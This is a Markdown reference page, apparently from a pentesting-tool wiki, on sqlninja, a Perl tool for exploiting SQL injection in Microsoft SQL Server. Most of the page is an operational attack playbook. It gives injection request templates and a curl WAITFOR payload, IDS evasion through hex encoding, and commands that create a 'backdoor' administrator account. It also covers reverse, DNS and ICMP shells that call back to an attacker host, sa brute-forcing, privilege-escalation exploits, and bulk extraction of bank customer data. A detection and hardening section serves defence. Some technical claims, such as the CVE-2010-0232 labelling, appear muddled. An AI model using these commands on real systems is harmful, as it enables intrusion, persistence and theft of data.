---
title: sqlninja
category: Initial Access
tags:
  - sql-injection
  - mssql
  - penetration-testing
  - perl
  - metasploit
  - shell
  - dns-tunneling
mitre:
  tactic: TA0001
  technique: Initial Access
  id: T1190
difficulty: advanced
platforms:
  - linux
  - freebsd
  - macos
languages:
  - perl
dependencies:
  - perl
  - libnet-pcap-perl
  - libnet-dns-perl
  - libnet-rawip-perl
  - libnetpacket-perl
  - libio-socket-ssl-perl
  - metasploit-framework (optional)
created: "2006"
author: icesurfer
organization: icesurfer (individual)
license: GPL-3.0
status: maintained
github: https://sourceforge.net/projects/sqlninja/
kali: https://www.kali.org/tools/sqlninja/
---

# sqlninja

## 1. Introduction & Overview

sqlninja is a specialized SQL injection exploitation tool designed exclusively for Microsoft SQL Server backends. Rather than discovering injection vulnerabilities, sqlninja focuses on what happens after you find one: fingerprinting the remote SQL Server, escalating privileges, recreating disabled extended procedures, uploading binaries, establishing reverse shells, tunneling through DNS/ICMP, and integrating with Metasploit for Meterpreter or VNC access.

Developed by icesurfer and released under GPLv3, sqlninja is written entirely in Perl and ships with Kali Linux. Its attack flow is methodical — test the injection, fingerprint the database, escalate to sysadmin, upload tools, and establish the best possible shell connection given the network constraints.

**Key characteristics:**

- Purpose-built for Microsoft SQL Server exploitation
- 14 distinct attack modes covering the full MSSQL exploitation lifecycle
- Multiple shell channels: direct, reverse TCP/UDP, DNS tunnel, ICMP tunnel
- Built-in Metasploit integration for Meterpreter and VNC
- Privilege escalation via `sp_addsrvrolemember`, token kidnapping, and CVE-2010-0232
- `xp_cmdshell` recreation when disabled
- IDS/IPS evasion through query obfuscation
- Data extraction via WAITFOR inference or DNS-based tunnels
- Configuration file-driven for repeatable attack workflows

**MITRE ATT&CK Mapping:**

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Persistence | Server Software Component | T1505 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Lateral Movement | Remote Services | T1021 |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 |

**When to use this tool:**

- During penetration tests against web applications backed by Microsoft SQL Server
- When a SQL injection vulnerability has been confirmed and OS-level access is the goal
- In environments where standard reverse shells are blocked but DNS or ICMP traffic is permitted
- When Metasploit Meterpreter or VNC access is desired on the remote database server

**When NOT to use this tool:**

- Against MySQL, PostgreSQL, Oracle, or any non-MSSQL database
- When you haven't confirmed a SQL injection vulnerability exists
- Against applications that don't use Microsoft SQL Server as a backend
- In environments without Perl and its required modules

---

## 2. Installation & Setup

### Prerequisites

sqlninja requires Perl and several CPAN modules:

| Module | Purpose | Install (Debian/Kali) |
|--------|---------|----------------------|
| `Net::Packet` | Raw packet crafting | `apt install libnetpacket-perl` |
| `Net::Pcap` | Packet capture | `apt install libnet-pcap-perl` |
| `Net::DNS` | DNS resolution and tunneling | `apt install libnet-dns-perl` |
| `Net::RawIP` | Raw IP packet construction | `apt install libnet-rawip-perl` |
| `IO::Socket::SSL` | HTTPS connections | `apt install libio-socket-ssl-perl` |
| `DBI` | Database interface (optional) | `apt install libdbi-perl` |

### Installation Methods

**Method 1: Kali Linux (recommended)**

```bash
sudo apt update && sudo apt install sqlninja
```

**Method 2: From source**

```bash
git clone https://gitlab.com/kalilinux/packages/sqlninja.git
cd sqlninja
perl Makefile.PL
make
make test
sudo make install
```

**Method 3: Manual download**

```bash
wget https://sourceforge.net/projects/sqlninja/files/sqlninja-0.2.6-r1.tar.gz
tar xzf sqlninja-0.2.6-r1.tar.gz
cd sqlninja-0.2.6-r1
perl Makefile.PL
make
sudo make install
```

### Metasploit Integration

For the `metasploit` attack mode, Metasploit Framework must be installed and accessible:

```bash
# Verify Metasploit is installed
which msfconsole
which msfvenom

# If Metasploit executables are not in PATH, set msfpath in config:
msfpath = /opt/metasploit-framework/bin
```

### Perl Module Verification

```bash
# Check all required modules
perl -MNet::Pcap -e 'print "Net::Pcap OK\n"'
perl -MNet::DNS -e 'print "Net::DNS OK\n"'
perl -MNet::RawIP -e 'print "Net::RawIP OK\n"'
perl -MNetPacket -e 'print "NetPacket OK\n"'
perl -MIO::Socket::SSL -e 'print "IO::Socket::SSL OK\n"'

# If any are missing, install via apt:
sudo apt install libnet-pcap-perl libnet-dns-perl libnet-rawip-perl libnetpacket-perl libio-socket-ssl-perl
```

---

## 3. Basic Usage

### First Run

```bash
# Create the configuration file
nano ~/sqlninja.conf

# Test the injection
sqlninja -m t -f ~/sqlninja.conf
```

**Explanation:** The `-m t` flag selects test mode, which injects a `WAITFOR DELAY` query and checks if the remote server processes it. The `-f` flag specifies the configuration file containing the target details. A successful test confirms your configuration is correct and the injection is working.

### Essential Configuration File

Create `~/sqlninja.conf` with the minimum required options:

```bash
cat > ~/sqlninja.conf << 'EOF'
# Target configuration
--httprequest_start--
GET http://192.168.1.51/page.asp?id=1';__SQL2INJECT__-- HTTP/1.0
Host: 192.168.1.51
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
Accept: text/html
Connection: close
--httprequest_end--

# Attacker IP (for reverse connections)
lhost = 192.168.1.2

# Network interface (for packet capture)
device = eth0
EOF
```

### Essential Commands

**Step 1 — Test injection:**

```bash
sqlninja -m t -f ~/sqlninja.conf
```

**Step 2 — Fingerprint the remote SQL Server:**

```bash
sqlninja -m f -f ~/sqlninja.conf
```

**Step 3 — Brute-force the `sa` password (SQL Server 2000):**

```bash
sqlninja -m b -f ~/sqlninja.conf -w /usr/share/wordlists/rockyou.txt
```

**Step 4 — Recreate xp_cmdshell (if disabled):**

```bash
sqlninja -m x -f ~/sqlninja.conf
```

**Step 5 — Upload netcat:**

```bash
sqlninja -m u -f ~/sqlninja.conf
```

**Step 6 — Get a direct shell:**

```bash
sqlninja -m s -f ~/sqlninja.conf
```

**Step 7 — Alternative: Get a reverse shell:**

```bash
sqlninja -m r -f ~/sqlninja.conf
```

### Flags Reference

| Flag | Description | Example |
|------|-------------|---------|
| `-m <mode>` | Attack mode (required) | `-m t`, `-m fingerprint`, `-m metasploit` |
| `-f <file>` | Configuration file (default: `sqlninja.conf`) | `-f /root/sqlninja.conf` |
| `-p <password>` | `sa` password for privilege escalation | `-p "Password1"` |
| `-w <wordlist>` | Wordlist for dictionary brute-force | `-w /usr/share/wordlists/rockyou.txt` |
| `-g` | Generate debug script and exit (upload mode only) | `-m u -g` |
| `-v` | Verbose output | `-v` |
| `-d <level>` | Debug output (1=SQL, 2=HTTP req, 3=HTTP resp, all) | `-d all` |

### Attack Modes

| Mode | Shortcut | Description |
|------|----------|-------------|
| `test` | `t` | Test if injection is working |
| `fingerprint` | `f` | Fingerprint remote SQL Server |
| `bruteforce` | `b` | Brute-force `sa` password |
| `escalation` | `e` | Add user to sysadmin role |
| `resurrectxp` | `x` | Recreate xp_cmdshell |
| `upload` | `u` | Upload binary file to target |
| `dirshell` | `s` | Direct shell (bind) |
| `backscan` | `k` | Scan for open outbound ports |
| `revshell` | `r` | Reverse shell |
| `dnstunnel` | `d` | DNS-tunneled pseudoshell |
| `icmpshell` | `i` | ICMP-tunneled reverse shell |
| `metasploit` | `m` | Metasploit wrapper (Meterpreter/VNC) |
| `sqlcmd` | `c` | Issue blind OS commands |
| `getdata` | `g` | Extract data from database |

---

## 4. Intermediate Usage

### Attack Flow Decision Tree

```
1. Test injection (-m t)
2. Fingerprint (-m f)
3. Need sysadmin? → Bruteforce (-m b) or Escalation (-m e)
4. xp_cmdshell disabled? → Resurrect (-m x)
5. Upload netcat (-m u)
6. Direct shell possible? → dirshell (-m s)
7. Need to find outbound port? → backscan (-m k)
8. Reverse shell? → revshell (-m r)
9. No TCP ports? → ICMP shell (-m i) or DNS tunnel (-m d)
10. Want Meterpreter/VNC? → metasploit (-m m)
11. None of above? → sqlcmd (-m c) for blind commands
```

### Configuration File — Complete Reference

**Basic options:**

```bash
# HTTP request (required)
--httprequest_start--
POST https://target.example.com/page.asp HTTP/1.0
Host: target.example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Cookie: ASPSESSIONID=xxxxxxxx

param=123';__SQL2INJECT__
--httprequest_end--

# Attacker IP (for reverse connections)
lhost = 192.168.1.2

# Network interface
device = eth0

# HTTP proxy (optional)
proxyhost = 127.0.0.1
proxyport = 8080

# DNS domain (for dnstunnel mode)
domain = sqlninja.example.com

# Metasploit path (if not in PATH)
msfpath = /opt/metasploit-framework/bin

# Evasion techniques (combine digits: 1=hex, 2=comments, 3=randomcase, 4=uriencode)
evasion = 0

# Metasploit encoder
msfencoder = x86/shikata_ga_nai

# Upload method (debug or vbscript)
upload_method = vbscript
```

**Data extraction options:**

```bash
# Extraction channel: time or dns
data_channel = time

# Extraction method: binary, optimized, or serial
data_extraction = optimized

# Language map for frequency-based extraction
language_map = english

# Adaptive language map
language_map_adaptive = yes

# Blind time (seconds) for WAITFOR-based extraction
blindtime = 5
```

### Blind Command Execution

When no shell is possible, use `sqlcmd` mode for blind command execution:

```bash
# Execute a command and verify via timing
sqlninja -m c -f ~/sqlninja.conf

# In the interactive prompt:
# Check if a file exists:
if exist c:\windows\win.exe (ping -n 5 127.0.0.1)

# Check if running as SYSTEM:
whoami > who.txt & find /i "\system " who.txt & if not errorlevel = 1 ping -n 5 127.0.0.1 & del who.txt

# Add a local user:
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add
```

**Explanation:** Blind commands execute on the remote server without returning output. Use timing-based inference: commands that take ~5 seconds indicate success (e.g., `ping -n 5 127.0.0.1`). The `ERRORLEVEL` variable can also indicate success (0 = no error).

### Evasion Configuration

Bypass IDS/IPS with built-in evasion techniques:

```bash
# Enable all evasion techniques
evasion = 1234

# Individual techniques:
# 1 = Hex-encode the entire query
# 2 = Replace spaces with /**/
# 3 = Randomize SQL keyword case
# 4 = Random URI encoding
```

**Example evasion output (technique 1 — hex encoding):**

```sql
-- Original:
exec master..xp_cmdshell 'cmd /C ping 127.0.0.1'

-- Hex-encoded:
declare @a varchar(8000) set @a=0x65786563206d61737465722e2e78705f636d647368656c6c2027636d64202f432070696e67203132372e302e302e31273b exec (@a)
```

**Explanation:** Hex encoding eliminates all SQL keywords from the injected string, bypassing signature-based detection. The `DECLARE` and `EXEC` statements are the only visible SQL, making it much harder for WAF rules to match known attack patterns.

---

## 5. Advanced Usage

### DNS Tunneling for Shell Access

When no TCP/UDP ports are available for direct or reverse shells, DNS tunneling provides a pseudoshell:

**Prerequisites:**

- You control a DNS domain (e.g., `sqlninja.example.com`)
- Your IP is the authoritative DNS server for that domain
- The target can resolve external DNS queries
- `dnstun.exe` has been uploaded to the target

**Setup:**

```bash
# 1. Upload dnstun.exe
sqlninja -m u -f ~/sqlninja.conf

# 2. Start DNS tunnel (requires root)
sudo sqlninja -m d -f ~/sqlninja.conf

# 3. Enter commands — output is exfiltrated via DNS queries
# The encoded output appears as: encoded_data.sqlninja.example.com
```

**How it works:**

1. Command output is base32-encoded
2. Encoded data is split into DNS hostname labels
3. DNS queries are sent to your authoritative server
4. sqlninja receives and decodes the queries
5. Commands and responses stream in real-time

### ICMP Tunneling

For environments where DNS tunneling isn't possible but ICMP echo is allowed:

```bash
# 1. Upload icmpsh.exe
sqlninja -m u -f ~/sqlninja.conf

# 2. Disable ICMP echo replies on your machine
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# 3. Start ICMP shell
sqlninja -m i -f ~/sqlninja.conf

# 4. Configure tunnel parameters when prompted:
#    Data buffer size: 64 (default) — increase for speed (max ~1400)
#    Send delay: 300ms (default) — decrease for speed (risk: DoS detection)
#    Response timeout: 3000ms (default)
```

**Explanation:** The ICMP tunnel encapsulates shell traffic inside ICMP Echo Request/Reply packets. This bypasses firewall rules that block TCP/UDP but permit ICMP (ping). The `icmp_echo_ignore_all` sysctl setting prevents your own kernel from responding to ICMP, avoiding conflicts with the tunnel.

### Metasploit Integration

For Meterpreter sessions or VNC GUI access:

```bash
# 1. Fingerprint to confirm sysadmin + xp_cmdshell
sqlninja -m f -f ~/sqlninja.conf

# 2. Upload netcat
sqlninja -m u -f ~/sqlninja.conf

# 3. Launch Metasploit mode
sqlninja -m m -f ~/sqlninja.conf

# Select when prompted:
# - Meterpreter or VNC
# - Direct or reverse connection
# - Host/port details
```

**What happens internally:**

1. sqlninja calls `msfvenom` to create a stager executable
2. The stager is encoded as a debug script or base64
3. The encoded stager is uploaded via the injection point
4. DEP is disabled via registry modification (if needed)
5. sqlninja calls `msfconsole` to complete the exploitation

### Privilege Escalation

**Method 1: Brute-force `sa` password (SQL Server 2000):**

```bash
# Dictionary attack
sqlninja -m b -f ~/sqlninja.conf -w /usr/share/wordlists/sql.txt

# Incremental attack (no wordlist — tries all combinations)
sqlninja -m b -f ~/sqlninja.conf
```

**Method 2: Token kidnapping (Windows Server 2003):**

```bash
# 1. Upload churrasco.exe
sqlninja -m u -f ~/sqlninja.conf

# 2. Set usechurrasco = yes in config

# 3. All subsequent commands are wrapped with churrasco.exe
```

**Method 3: CVE-2010-0232:**

```bash
# 1. Upload vdmallowed.exe and vdmexploit.dll
sqlninja -m u -f ~/sqlninja.conf

# 2. Execute via sqlcmd mode
sqlninja -m c -f ~/sqlninja.conf
# Enter: %TEMP%\vdmallowed sql

# 3. Verify SYSTEM privileges
sqlninja -m f -f ~/sqlninja.conf
```

### Data Extraction

When no shell is possible, extract database content:

**Time-based extraction:**

```bash
# 1. Set data_channel = time in config
# 2. Launch getdata mode
sqlninja -m g -f ~/sqlninja.conf

# Interactive prompts:
# - Select extraction method (binary search or serial)
# - Select database → schema → table → column
# - Data is extracted via WAITFOR DELAY inference
```

**DNS-based extraction (faster):**

```bash
# 1. Set data_channel = dns and domain = your.domain.com
# 2. Run as root (needs port 53)
sudo sqlninja -m g -f ~/sqlninja.conf
```

---

## 6. Real-World Scenarios

### Scenario 1: Corporate Penetration Test — SQL Server Behind Firewall

**Target:** Internal web application running on IIS with Microsoft SQL Server 2008 backend. Firewall blocks all inbound connections but allows outbound DNS.

**Steps:**

```bash
# 1. Create configuration file
cat > ~/sqlninja.conf << 'EOF'
--httprequest_start--
GET http://webapp.internal.local/search.aspx?q=test';__SQL2INJECT__-- HTTP/1.0
Host: webapp.internal.local
User-Agent: Mozilla/5.0
Connection: close
--httprequest_end--
lhost = 192.168.10.50
device = eth0
domain = sqlninja.attacker.com
EOF

# 2. Test injection
sqlninja -m t -f ~/sqlninja.conf
# [+] Target is: webapp.internal.local:80
# [+] Trying to inject a 'waitfor delay'....
# [+] It worked!

# 3. Fingerprint
sqlninja -m f -f ~/sqlninja.conf
# Version: SQL Server 2008
# User: webapp_user
# Sysadmin: No
# xp_cmdshell: Yes (but permissions restricted)
# Auth mode: Mixed

# 4. Brute-force sa password
sqlninja -m b -f ~/sqlninja.conf -w /usr/share/wordlists/sql-2000.txt
# [+] Password found: sa / SQL2008pass!

# 5. Upload tools
sqlninja -m u -f ~/sqlninja.conf
# Upload netcat.exe, dnstun.exe

# 6. DNS tunnel shell (no TCP ports available)
sudo sqlninja -m d -f ~/sqlninja.conf
# Shell obtained via DNS tunneling
```

**Outcome:** Full database server access via DNS-tunneled shell despite strict firewall rules.

### Scenario 2: Red Team — MSSQL with xp_cmdshell Disabled

**Target:** E-commerce platform with Microsoft SQL Server 2012. `xp_cmdshell` has been disabled by the DBA.

**Steps:**

```bash
# 1. Test and fingerprint
sqlninja -m t -f ~/sqlninja.conf
sqlninja -m f -f ~/sqlninja.conf
# xp_cmdshell: Disabled
# Sysadmin: Yes (web app runs as sa)

# 2. Recreate xp_cmdshell
sqlninja -m x -f ~/sqlninja.conf
# sqlninja asks for SQL Server version → 2012
# [+] xp_cmdshell recreated with sp_configure

# 3. Upload netcat
sqlninja -m u -f ~/sqlninja.conf

# 4. Find outbound port
sqlninja -m k -f ~/sqlninja.conf
# Scanning ports 80, 443, 53...
# [+] Port 80 is open outbound

# 5. Reverse shell on port 80
sqlninja -m r -f ~/sqlninja.conf
# Shell obtained on port 80

# 6. Escalate to SYSTEM via token kidnapping
sqlninja -m u -f ~/sqlninja.conf  # Upload churrasco.exe
# Set usechurrasco = yes in config
# All commands now run as SYSTEM
```

**Outcome:** System-level access achieved by recreating xp_cmdshell and escalating via token kidnapping.

### Scenario 3: Data Breach Assessment — Financial Application

**Target:** Banking web application with SQL Server 2005. Only time-based extraction is possible — no shell access.

**Steps:**

```bash
# 1. Fingerprint shows:
# SQL Server 2005, db_user role, no sysadmin, xp_cmdshell: No

# 2. Configure for data extraction
cat >> ~/sqlninja.conf << 'EOF'
data_channel = time
data_extraction = optimized
blindtime = 5
EOF

# 3. Start data extraction
sqlninja -m g -f ~/sqlninja.conf

# 4. Navigate the database:
# master → production_db → users table → all columns

# 5. Extract sensitive data:
# Customer names, account numbers, balances
# Extracted to local SQLite database (session.db)

# 6. Export for compliance report
sqlite3 session.db ".dump" > extracted_data.sql
```

**Outcome:** Full database extraction demonstrating the impact of SQL injection on financial data.

---

## 7. Detection & Defense

### Indicators of Compromise (IOCs)

**Network-level:**

- `WAITFOR DELAY` patterns in HTTP requests
- `OPENROWSET` calls to the same server (self-referencing connections)
- DNS queries with encoded data to unusual domains
- ICMP echo requests with large payloads (ICMP tunneling)
- Outbound connections from the database server on unexpected ports

**Application-level:**

- `xp_cmdshell` or `sp_addextendedproc` in SQL logs
- `sp_addsrvrolemember` privilege escalation attempts
- `OPENROWSET` brute-force patterns (repeated short connections)
- Binary upload attempts via debug scripts or base64

**Host-level:**

- New executables in `%TEMP%` directory
- `netcat.exe`, `dnstun.exe`, `icmpsh.exe` processes
- Unusual service installations or scheduled tasks
- Registry modifications to disable DEP

### Detection Rules

**Suricata/Snort signature:**

```
alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SQL Ninja WAITFOR Delay Injection";
    content:"WAITFOR"; http_client_body;
    pcre:"/WAITFOR\s+DELAY/i";
    classtype:web-application-attack;
    sid:2000001; rev:1;
)

alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SQL Ninja OPENROWSET Brute Force";
    content:"OPENROWSET"; http_client_body;
    threshold:type both, track by_src, count 10, seconds 60;
    classtype:web-application-attack;
    sid:2000002; rev:1;
)
```

**YARA rule for debug scripts:**

```yara
rule SQLNinja_Debug_Script {
    meta:
        description = "Detects SQLNinja debug script upload"
    strings:
        $debug1 = "DEBUG.EXE"
        $debug2 = "bp" ascii
        $debug3 = "r cx"
        $debug4 = "w" ascii
        $base64 = "Base64"
        $dnstun = "dnstun"
        $icmpsh = "icmpsh"
    condition:
        ($debug1 and $debug2 and $debug3 and $debug4) or
        ($base64 and ($dnstun or $icmpsh))
}
```

### Hardening Microsoft SQL Server

1. **Disable `xp_cmdshell`:** `EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;`
2. **Disable `OPENROWSET`:** Prevent non-admin users from self-referencing connections
3. **Remove `xplog70.dll`:** Prevent `xp_cmdshell` recreation via `sp_addextendedproc`
4. **Use least-privilege accounts:** Web applications should not run as `sa`
5. **Enable SQL Server Authentication Auditing:** Log all authentication attempts
6. **Network segmentation:** Isolate SQL Server from direct internet access
7. **Enable Windows DEP:** Prevent DLL injection attacks
8. **Patch CVE-2010-0232:** Apply the token kidnapping fix
9. **Configure firewall:** Block outbound connections from SQL Server except required services
10. **Enable connection encryption:** Prevent credential interception

### SQL Server Hardening Script

```sql
-- Disable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable OPENROWSET
EXEC sp_configure 'Ad Hoc Distributed Queries', 0;
RECONFIGURE;

-- Remove sa account or change its password
ALTER LOGIN sa DISABLE;

-- Create dedicated least-privilege account for web app
CREATE LOGIN webapp_user WITH PASSWORD = 'ComplexP@ssw0rd!';
USE production_db;
CREATE USER webapp_user FOR LOGIN webapp_user;
GRANT SELECT, INSERT, UPDATE, DELETE ON SCHEMA::dbo TO webapp_user;

-- Enable login auditing
EXEC xp_instance_regwrite N'HKEY_LOCAL_MACHINE', 
    N'Software\Microsoft\MSSQLServer\MSSQLServer', 
    N'AuditLevel', REG_DWORD, 3;
```

---

## 8. Troubleshooting

### Common Issues and Solutions

**Problem:** `Can't locate Net/Pcap.pm in @INC`

```bash
# Install missing Perl modules
sudo apt install libnet-pcap-perl libnet-dns-perl libnet-rawip-perl libnetpacket-perl

# Or via CPAN
sudo cpan Net::Pcap Net::DNS Net::RawIP NetPacket
```

**Problem:** `WAITFOR DELAY` doesn't work / injection test fails

```bash
# 1. Verify HTTP request format in config
# - Use HTTP/1.0 (not 1.1) to avoid keep-alive issues
# - Ensure injection marker __SQL2INJECT__ is placed correctly
# - Check that you properly close the original query

# 2. Test with curl
curl -v "http://target/page.asp?id=1';WAITFOR DELAY '0:0:5'--"

# 3. Increase blindtime in config
blindtime = 10
```

**Problem:** Brute-force mode fails / OPENROWSET blocked

```bash
# This is expected for SQL Server 2005+ non-admin users
# OPENROWSET is disabled by default for non-sysadmin users

# Alternative: use getdata mode for data extraction
sqlninja -m g -f ~/sqlninja.conf
```

**Problem:** Upload fails repeatedly

```bash
# 1. Try the vbscript upload method (more reliable on modern systems)
upload_method = vbscript

# 2. Enable verbose output to diagnose
sqlninja -m u -f ~/sqlninja.conf -v

# 3. Check if MSSQL can write to %TEMP%
# Use sqlcmd mode to verify:
sqlninja -m c -f ~/sqlninja.conf
# Enter: echo test > %TEMP%\test.txt
```

**Problem:** DNS tunnel doesn't resolve

```bash
# 1. Verify you're running as root (needs port 53)
sudo sqlninja -m d -f ~/sqlninja.conf

# 2. Check your domain's NS records
dig NS sqlninja.example.com

# 3. Verify your IP is authoritative
dig @$(dig NS sqlninja.example.com +short | head -1) sqlninja.example.com

# 4. Check firewall allows UDP port 53
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
```

**Problem:** ICMP tunnel is slow or drops packets

```bash
# 1. Increase buffer size (default: 64, max: ~1400)
# Set to 1200 for faster throughput

# 2. Decrease send delay (default: 300ms, min: 50ms)
# But beware of DoS detection

# 3. Verify ICMP echo is ignored on your box
sysctl net.ipv4.icmp_echo_ignore_all
# Should return 1
```

**Problem:** Metasploit mode fails

```bash
# 1. Verify msfconsole and msfvenom are accessible
which msfconsole
which msfvenom

# 2. Set msfpath in config if not in PATH
msfpath = /opt/metasploit-framework/bin

# 3. Check Metasploit version (v3+ required)
msfconsole -v

# 4. For older msfcli/msfpayload (legacy):
# These were removed in Metasploit 4.x — use msfvenom instead
```

**Problem:** Data extraction is extremely slow

```bash
# 1. Switch from TIME to DNS-based extraction
data_channel = dns
domain = sqlninja.example.com

# 2. Use binary search instead of serial
data_extraction = binary

# 3. Increase blindtime to reduce false positives
blindtime = 8
```

### Debugging

```bash
# Level 1: Show SQL commands
sqlninja -m t -f ~/sqlninja.conf -d 1

# Level 2: Show raw HTTP requests
sqlninja -m t -f ~/sqlninja.conf -d 2

# Level 3: Show raw HTTP responses
sqlninja -m t -f ~/sqlninja.conf -d 3

# All debug info
sqlninja -m t -f ~/sqlninja.conf -d all

# Verbose output
sqlninja -m t -f ~/sqlninja.conf -v
```

### Generating Debug Scripts

```bash
# Generate a debug script without uploading
sqlninja -m u -f ~/sqlninja.conf -g
# Script saved to /tmp/ — inspect or use with other tools
```

---

## Resources

- **Kali Linux Tool Page:** https://www.kali.org/tools/sqlninja/
- **SourceForge:** https://sourceforge.net/projects/sqlninja/
- **Official Documentation:** https://sqlninja.sourceforge.net/sqlninja-howto.html
- **FAQ:** https://sqlninja.sourceforge.net/faq.html
- **Demo:** https://sqlninja.sourceforge.net/sqlninjademo.html
- **GPLv3 License:** https://www.gnu.org/licenses/gpl.html
- **Advanced SQL Injection PDFs:**
  - http://www.northernfortress.net/advanced_sql_injection.pdf
  - http://www.northernfortress.net/more_advanced_sql_injection.pdf
  - http://www.northernfortress.net/sqlinference.pdf
- **Token Kidnapping Research:** http://www.argeniss.com/research/TokenKidnapping.pdf
- **CVE-2010-0232:** Microsoft Windows Token Kidnapping Privilege Escalation
- **MITRE ATT&CK - Exploit Public-Facing Application:** https://attack.mitre.org/techniques/T1190/

---

**See Also:**
- [jsql](../jsql/jsql.md) - Cross-platform SQL injection GUI tool
- [jboss-autopwn](../jboss-autopwn/jboss-autopwn.md) - JBoss exploitation framework
